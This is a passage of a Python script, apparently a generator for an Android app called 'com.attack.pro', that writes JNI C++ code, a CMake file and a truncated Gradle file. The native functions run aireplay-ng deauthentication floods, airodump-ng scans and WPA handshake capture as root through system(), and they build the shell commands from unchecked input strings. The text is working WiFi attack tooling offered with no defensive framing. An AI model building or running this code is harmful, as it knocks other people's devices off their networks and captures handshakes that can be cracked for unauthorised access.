    # native_inject.cpp
    native_cpp = '''#include <jni.h>
#include <cstdlib>
#include <cstring>

extern "C" JNIEXPORT void JNICALL
Java_com_attack_pro_MainActivity_sendDeauth(JNIEnv* env, jobject thiz,
                                            jstring iface, jstring bssid, jstring client) {
    const char *i = env->GetStringUTFChars(iface, nullptr);
    const char *b = env->GetStringUTFChars(bssid, nullptr);
    const char *c = env->GetStringUTFChars(client, nullptr);
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "su -c 'airmon-ng start %s; aireplay-ng -0 10 -a %s -c %s %smon'", i, b, c, i);
    system(cmd);
    env->ReleaseStringUTFChars(iface, i);
    env->ReleaseStringUTFChars(bssid, b);
    env->ReleaseStringUTFChars(client, c);
}

extern "C" JNIEXPORT void JNICALL
Java_com_attack_pro_MainActivity_scanNetworks(JNIEnv* env, jobject thiz, jstring iface) {
    const char *i = env->GetStringUTFChars(iface, nullptr);
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "su -c 'airodump-ng %s --output-format csv -w /sdcard/scan'", i);
    system(cmd);
    env->ReleaseStringUTFChars(iface, i);
}

extern "C" JNIEXPORT void JNICALL
Java_com_attack_pro_MainActivity_captureHandshake(JNIEnv* env, jobject thiz,
                                                  jstring iface, jstring bssid, jstring channel) {
    const char *i = env->GetStringUTFChars(iface, nullptr);
    const char *b = env->GetStringUTFChars(bssid, nullptr);
    const char *ch = env->GetStringUTFChars(channel, nullptr);
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "su -c 'airodump-ng -c %s --bssid %s -w /sdcard/handshake %smon'", ch, b, i);
    system(cmd);
    env->ReleaseStringUTFChars(iface, i);
    env->ReleaseStringUTFChars(bssid, b);
    env->ReleaseStringUTFChars(channel, ch);
}'''
    write_file(os.path.join(CPP_DIR, "native_inject.cpp"), native_cpp)

    # CMakeLists.txt
    cmake = '''cmake_minimum_required(VERSION 3.18)
project("native_inject")
add_library(native_inject SHARED native_inject.cpp)
target_compile_options(native_inject PRIVATE -O2 -fPIC)
find_library(log-lib log)
target_link_libraries(native_inject ${log-lib})'''
    write_file(os.path.join(CPP_DIR, "CMakeLists.txt"), cmake)

    # build.gradle (app)
    app_gradle = '''plugins { id 'com.android.application' }
android {
    namespace 'com.attack.pro'
    compileSdk 33
    defaultConfig {
        applicationId 'com.attack.pro'
        minSdk 23
        targetSdk 33
        versionCode 1
        versionName '1.0'
        externalNativeBuild { cmake { path 'src/main/cpp/CMakeLists.txt' } }
    }
